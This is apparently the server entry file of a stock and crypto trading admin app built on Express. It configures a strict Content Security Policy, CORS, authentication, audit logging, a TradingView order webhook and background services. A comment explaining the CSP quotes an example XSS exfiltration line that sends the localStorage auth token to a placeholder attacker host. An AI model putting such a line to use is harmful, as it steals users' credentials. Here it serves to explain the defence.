/**
 * Simplifyed Admin V2 - Server Entry Point
 * Complete rebuild with clean architecture
 */

// Force server timezone to IST for consistent timestamps across the app
process.env.TZ = 'Asia/Kolkata';

import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import compression from 'compression';
import http from 'http';
import { config } from './src/core/config.js';
import { log } from './src/core/logger.js';
import db from './src/core/database.js';
import pollingService from './src/services/polling.service.js';
import marketDataFeedService from './src/services/market-data-feed.service.js';
import autoExitService from './src/services/auto-exit.service.js';
import openalgoClient from './src/integrations/openalgo/client.js';
import settingsService from './src/services/settings.service.js';
import instanceHealthService from './src/services/instance-health.service.js';
import instrumentsService from './src/services/instruments.service.js';
import wsGatewayService from './src/services/ws-gateway.service.js';
import tradingviewWebhookRoutes from './src/routes/tradingview-webhook.js';
import idempotencyService from './src/services/idempotency.service.js';

// Middleware
import { requireAuth, optionalAuth, verifyLocalToken } from './src/middleware/auth.js';
import { errorHandler, notFoundHandler } from './src/middleware/error-handler.js';
import { correlationId, requestLogger, bodyParserErrorHandler } from './src/middleware/request-logger.js';
import { noStore } from './src/middleware/no-store.js';
import { auditLogger } from './src/middleware/audit-logger.js';

// Routes
import apiV1Routes from './src/routes/v1/index.js';

let servicesStarted = false;

async function startBackgroundServices() {
  if (servicesStarted) return;
  // Set the guard before any awaits so concurrent requests racing in here (optionalAuth calls
  // this on every authenticated request) can't all pass the `if (servicesStarted) return` check
  // during the async startup window and redundantly re-run the whole sequence.
  servicesStarted = true;

  try {
    await marketDataFeedService.start({
      quoteInterval: config.polling.marketDataInterval || undefined,
    });
    log.info('Market data feed service started');

    await autoExitService.start();
    log.info('Auto exit service started');

    await pollingService.start();
    log.info('Polling service started');

    // Telegram integration is webhook-based (see routes/v1/telegram.js POST /webhook), so no
    // polling service needs to be started here.
  } catch (err) {
    servicesStarted = false;
    log.error('Failed to start background services', err);
    throw err;
  }
}

function stopBackgroundServices() {
  try {
    marketDataFeedService.stop && marketDataFeedService.stop();
    autoExitService.stop && autoExitService.stop();
    pollingService.stop && pollingService.stop();
  } catch (err) {
    log.warn('Error stopping background services', { error: err.message });
  }
  servicesStarted = false;
}

// Create Express app
const app = express();
const server = http.createServer(app);
app.set('trust proxy', 1);

/**
 * Middleware Setup
 */

// Security
//
// Every asset this app serves is same-origin (see public/*.html - local fonts, vendored charts,
// no CDN), and nothing uses eval or new Function, so a real CSP costs nothing to switch on.
//
// script-src keeps 'unsafe-inline' deliberately: the UI has ~150 onclick= handlers, most of them
// written into innerHTML by the dashboard modules, and a nonce cannot cover attributes. Dropping
// it means rewiring all of them to addEventListener - worth doing, but it is a UI-wide refactor,
// not a header change.
//
// The directive that earns its keep even with inline scripts allowed is connect-src 'self': the
// auth token lives in localStorage, so the payoff from an XSS is shipping it somewhere. fetch,
// XHR, WebSocket and sendBeacon to any other origin are now refused, as is `new Image().src =
// '//attacker/?' + token` (img-src) and pulling a second-stage payload (script-src 'self').
// 'self' covers the same-origin WebSocket gateway at WS_GATEWAY_PATH under CSP Level 3.
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      // helmet defaults this to 'none', which blocks event-handler ATTRIBUTES specifically -
      // script-src 'unsafe-inline' does not cover them. Left at the default it would have
      // silently killed every onclick= in the dashboard, i.e. most of the UI.
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:'],
      fontSrc: ["'self'"],
      connectSrc: ["'self'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: null, // set by deployment TLS, not by the app
    },
  },
}));

// CORS
app.use(cors({
  origin: config.cors.origin,
  credentials: true,
}));

// Compression
app.use(compression());

// Body parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Body parser error handler
app.use(bodyParserErrorHandler);

// Correlation ID
app.use(correlationId);

// Request logging
app.use(requestLogger);

// Optional auth (sets req.user in test mode)
app.use(optionalAuth);

// API responses must never be cached - see middleware/no-store.js. Mounted on the API paths
// only: express.static below still gets to cache the frontend assets, which is what it is for.
app.use('/api/v1', noStore);
app.use('/api/user', noStore);
app.use('/webhook', noStore);

// Audit logger for mutating API requests
app.use('/api/v1', auditLogger);

/**
 * Routes
 */

// TradingView broadcast webhook (public token auth).
// auditLogger MUST be registered before the router: it works by attaching a res.on('finish')
// hook and calling next(), so mounted after the route it is simply never reached - the handler
// responds and never calls next(). Every webhook-placed order went unaudited, which is the one
// order path with no human in the loop and therefore the one that most needs the record.
app.use('/webhook/tradingview', auditLogger);
app.use('/webhook/tradingview', tradingviewWebhookRoutes);

// API v1
app.use('/api/v1', apiV1Routes);

// Auth: login/register are local email+password (see public/login.html and src/routes/v1/auth.js).
// Logout is client-side only: the credential is a stateless JWT in localStorage, so the client
// just drops it.

// Current user
app.get('/api/user', requireAuth, (req, res) => {
  res.json({
    status: 'success',
    data: {
      id: req.user.id,
      email: req.user.email,
      is_admin: req.user.is_admin,
      role: req.user.role,
      permissions: req.user.permissions || [],
    },
  });
});

// Static files (frontend)
app.use(express.static('public'));

// Unreachable instances are paused per broker call by the circuit breaker in
// integrations/openalgo/client.js; there is no app-level time-of-day guard.

// 404 handler
app.use(notFoundHandler);

// Global error handler
app.use(errorHandler);

/**
 * Server Startup
 */
async function startServer() {
  try {
    // Connect to database
    await db.connect();
    log.info('Database connected');
    await settingsService.ensureEssentialSettings();

    // Load configuration from database
    await config.loadFromDatabase();
    log.info('Configuration loaded from database');

    // Clean up expired idempotency keys and audit logs older than 7 days, on boot and every 6 hours
    const pruneAuditLogs = () => db.run("DELETE FROM audit_logs WHERE created_at < datetime('now', '-7 days')");
    await idempotencyService.cleanupExpired();
    await pruneAuditLogs();
    setInterval(() => {
      idempotencyService.cleanupExpired().catch(() => {});
      pruneAuditLogs().catch(() => {});
    }, 6 * 60 * 60 * 1000);

    // Initialize OpenAlgo client rate limits from database
    await openalgoClient.initializeRateLimits();
    log.info('OpenAlgo rate limits initialized');

    // Apply a saved Setting at once (see settings-registry.js for the full list).
    settingsService.on('settings:changed', async (data) => {
      try {
        if (data.category === 'rate_limits') await openalgoClient.reloadRateLimits();
        if (data.category === 'openalgo') await config.loadFromDatabase();
      } catch (err) {
        log.error('Failed to apply settings change', err, { category: data?.category });
      }
    });

    // Test mode (authentication disabled) needs a user row to act as. Gated on test mode alone:
    // seeding it anywhere else would close /auth/register before the real admin is created.
    if (config.auth.enableTestMode === true) {
      const testUser = await db.get('SELECT * FROM users WHERE id = 1');
      if (!testUser) {
        await db.run(
          'INSERT INTO users (id, email, is_admin) VALUES (1, ?, 1)',
          ['test@example.com']
        );
        // Assign Admin role to test user if roles exist
        const adminRole = await db.get('SELECT id FROM roles WHERE name = ?', ['Admin']);
        if (adminRole?.id) {
          await db.run(
            `INSERT OR REPLACE INTO user_roles (user_id, role_id, assigned_by) VALUES (?, ?, NULL)`,
            [1, adminRole.id]
          );
        }
        log.info('Test user created');
      }
    }

    // Start WebSocket gateway (opt-in, authenticated with the login token)
    wsGatewayService.start(server, {
      enabled: config.wsGateway?.enabled,
      path: config.wsGateway?.path,
      // The gateway used to check an express-session cookie here, which nothing in this
      // app ever issues (see verifyLocalToken's comment) - every WS connection was rejected,
      // not merely some of them. It now verifies the same locally-issued JWT every REST
      // request already authenticates with; the browser cannot set a custom Authorization
      // header on a WebSocket upgrade, so the client sends it as a `token` query param instead.
      tokenValidator: async (token) => Boolean(verifyLocalToken(token)),
    });

    // Start HTTP server
    server.listen(config.port, async () => {
      // Started unconditionally on boot, not lazily on the first login: a restart with no
      // browser open must not leave stop-loss/session-limit monitoring off while /webhook can
      // still place orders. startBackgroundServices() is already race-safe and logs its own
      // failure; a throw here becomes an unhandledRejection, handled below.
      await startBackgroundServices();

      log.info('Server started', {
        port: config.port,
        env: config.env,
        baseUrl: config.baseUrl,
        testMode: config.auth.enableTestMode === true,
        wsGateway: config.wsGateway?.enabled ? config.wsGateway?.path : 'disabled',
      });

      console.log('');
      console.log('╔════════════════════════════════════════════════════════════╗');
      console.log('║                                                            ║');
      console.log('║         Simplifyed Admin V2 - Server Running              ║');
      console.log('║                                                            ║');
      console.log('╠════════════════════════════════════════════════════════════╣');
      console.log(`║  Environment:  ${String(config.env || 'unknown').padEnd(43)} ║`);
      console.log(`║  Port:         ${String(config.port || 3000).padEnd(43)} ║`);
      console.log(`║  Base URL:     ${String(config.baseUrl || 'unknown').padEnd(43)} ║`);
      console.log(`║  Test Mode:    ${String(config.auth.enableTestMode === true ? 'Yes - AUTH DISABLED' : 'No').padEnd(43)} ║`);
      console.log('║                                                            ║');
      console.log('╠════════════════════════════════════════════════════════════╣');
      console.log('║  API Endpoints:                                            ║');
      console.log('║    - GET  /api/v1/health                                   ║');
      console.log('║    - GET  /api/v1/instances                                ║');
      console.log('║    - GET  /api/v1/watchlists                               ║');
      console.log('║    - GET  /api/v1/orders                                   ║');
      console.log('║    - GET  /api/v1/positions/:instanceId                    ║');
      console.log('║    - GET  /api/v1/symbols/search                           ║');
      console.log('║                                                            ║');
      console.log('╠════════════════════════════════════════════════════════════╣');
      console.log('║  Services:                                                 ║');
      console.log(`║    - Instance Updates:  Every ${(config.polling.instanceInterval / 1000).toString()}s ║`.padEnd(62) + '║');
      console.log(`║    - Market Data:       Every ${(config.polling.marketDataInterval / 1000).toString()}s (when active) ║`.padEnd(62) + '║');
      console.log('║    - Health Checks:     Every 5m                           ║');
      console.log('║    - Telegram:          Webhook-driven (no polling)        ║');
      console.log('║                                                            ║');
      console.log('╚════════════════════════════════════════════════════════════╝');
      console.log('');

      // Start instance health cron (every 3h from 08:00 IST)
      instanceHealthService.start();

      // Instruments: daily refresh crons (Indian 08:30, crypto 17:31 IST) plus a boot catch-up if stale
      instrumentsService.startScheduledRefresh();
    });
  } catch (error) {
    log.error('Failed to start server', error);
    process.exit(1);
  }
}

/**
 * Graceful Shutdown
 */
let shutdownStarted = false;

async function shutdown() {
  if (shutdownStarted) return;
  shutdownStarted = true;
  log.info('Shutting down server...');

  try {
    stopBackgroundServices();
    instanceHealthService.stop();
    instrumentsService.stopScheduledRefresh();
    wsGatewayService.stop();

    // Close database
    await db.close();
    log.info('Database closed');

    process.exit(0);
  } catch (error) {
    log.error('Error during shutdown', error);
    process.exit(1);
  }
}

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

process.on('unhandledRejection', (reason) => {
  log.error('Unhandled promise rejection', reason);
});

process.on('uncaughtException', (err) => {
  log.error('Uncaught exception', err);
  process.exit(1);
});

// Start server
startServer();
